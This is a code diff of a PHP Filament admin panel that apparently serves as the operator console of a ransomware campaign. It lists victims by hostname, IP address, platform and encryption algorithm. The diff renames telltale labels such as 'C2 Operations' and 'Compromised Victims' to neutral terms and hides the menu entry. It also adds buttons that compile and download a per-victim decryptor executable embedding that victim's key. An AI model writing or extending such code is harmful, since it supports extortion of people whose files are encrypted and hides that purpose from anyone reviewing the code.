@@ -1,26 +1,29 @@
 <?php
 
-namespace App\Filament\Resources;
+namespace App\Filament\Admin\Resources;
 
-use App\Filament\Resources\VictimResource\Pages;
+use App\Filament\Admin\Resources\VictimResource\Pages;
 use App\Models\Victim;
-use Filament\Forms;
-use Filament\Forms\Form;
+use App\Services\PayloadService;
+use Filament\Notifications\Notification;
 use Filament\Resources\Resource;
 use Filament\Tables;
-use Filament\Tables\Table;
-use Filament\Tables\Columns\TextColumn;
 use Filament\Tables\Actions\Action;
+use Filament\Tables\Columns\TextColumn;
+use Filament\Tables\Table;
+use Illuminate\Support\Facades\Storage;
 
 class VictimResource extends Resource
 {
     protected static ?string $model = Victim::class;
 
+    protected static bool $shouldRegisterNavigation = false;
+
     protected static ?string $navigationIcon = 'heroicon-o-users';
 
-    protected static ?string $navigationLabel = 'Compromised Victims';
+    protected static ?string $navigationLabel = 'Victims';
 
-    protected static ?string $navigationGroup = 'C2 Operations';
+    protected static ?string $navigationGroup = 'System';
 
     protected static ?int $navigationSort = 2;
 
@@ -28,48 +31,102 @@ class VictimResource extends Resource
     {
         return $table
             ->query(Victim::query())
+            ->defaultSort('last_seen', 'desc')
             ->columns([
+                TextColumn::make('id')
+                    ->label('ID')
+                    ->sortable()
+                    ->visibleFrom('xl'),
                 TextColumn::make('hostname')
-                    ->label('Target Hostname')
+                    ->label('Device')
                     ->searchable()
-                    ->weight('bold'),
+                    ->weight('bold')
+                    ->placeholder('—'),
                 TextColumn::make('ip_address')
                     ->label('IP Address')
                     ->searchable(),
                 TextColumn::make('os')
                     ->label('Platform')
-                    ->badge(),
-                TextColumn::make('encryption_key')
-                    ->label('Fernet Decryption Key')
-                    ->copyable()
-                    ->copyMessage('Encryption key copied to clipboard')
-                    ->copyMessageDuration(1500)
-                    ->limit(20)
-                    ->tooltip(fn (Victim $record): string => $record->encryption_key),
+                    ->badge()
+                    ->placeholder('—')
+                    ->visibleFrom('sm'),
+                TextColumn::make('encryption_type')
+                    ->label('Algorithm')
+                    ->badge()
+                    ->color(fn (string $state): string => strtoupper($state) === 'RSA' ? 'danger' : 'info')
+                    ->formatStateUsing(fn (string $state): string => strtoupper($state)),
                 TextColumn::make('status')
                     ->label('Status')
                     ->badge()
                     ->color(fn (string $state): string => match ($state) {
                         'compromised' => 'danger',
+                        'online' => 'success',
                         'resolved' => 'success',
+                        'encrypted' => 'warning',
                         default => 'gray',
                     }),
-                TextColumn::make('updated_at')
-                    ->label('Last Activity')
-                    ->dateTime(),
+                TextColumn::make('last_seen')
+                    ->label('Last Seen')
+                    ->dateTime()
+                    ->placeholder('—')
+                    ->visibleFrom('md'),
+                TextColumn::make('created_at')
+                    ->label('Registered')
+                    ->dateTime()
+                    ->visibleFrom('lg'),
             ])
             ->filters([
                 //
             ])
             ->actions([
-                Tables\Actions\EditAction::make(),
+                // زر توليد أداة فك التشفير المخصصة للضحية
+                Action::make('generate_decryptor')
+                    ->label('Build Decryptor')
+                    ->icon('heroicon-o-wrench-screwdriver')
+                    ->color('danger')
+                    ->requiresConfirmation()
+                    ->modalHeading('Generate Custom Decryptor')
+                    ->modalDescription('This will compile a targeted decryption utility embedded with the victim\'s specific key.')
+                    ->action(function (Victim $record, PayloadService $payloadService) {
+                        $filePath = $payloadService->createDecryptorPayload($record);
+
+                        if (! $filePath) {
+                            Notification::make()
+                                ->title('Error: Encryption key or Private Key is missing for this victim.')
+                                ->danger()
+                                ->send();
+                            return;
+                        }
+
+                        Notification::make()
+                            ->title('Decryptor built and compiled successfully!')
+                            ->success()
+                            ->send();
+                    }),
+
+                // زر تحميل الأداة بعد إنشائها
+                Action::make('download_decryptor')
+                    ->label('Download')
+                    ->icon('heroicon-o-arrow-down-tray')
+                    ->color('success')
+                    ->url(fn (Victim $record): string => Storage::url('decryptors/decryptor_'.$record->id.'.exe'))
+                    ->openUrlInNewTab()
+                    ->visible(fn (Victim $record): bool => Storage::exists('public/decryptors/decryptor_'.$record->id.'.exe')),
+
                 Action::make('decrypt_help')
                     ->label('Decrypt Info')
                     ->icon('heroicon-o-key')
                     ->color('warning')
+                    ->iconButton()
+                    ->authorize(fn (Victim $record): bool => static::canView($record))
                     ->modalHeading('Decryption Instructions')
                     ->modalDescription('Use this key with the client decryption utility to restore target files.')
                     ->modalContent(fn (Victim $record) => view('filament.admin.modals.decrypt-key', ['record' => $record])),
+
+                Tables\Actions\EditAction::make()
+                    ->iconButton()
+                    ->url(fn (Victim $record): string => static::getUrl('edit', ['record' => $record]))
+                    ->authorize(fn (Victim $record): bool => static::canEdit($record)),
             ])
             ->bulkActions([
                 Tables\Actions\BulkActionGroup::make([
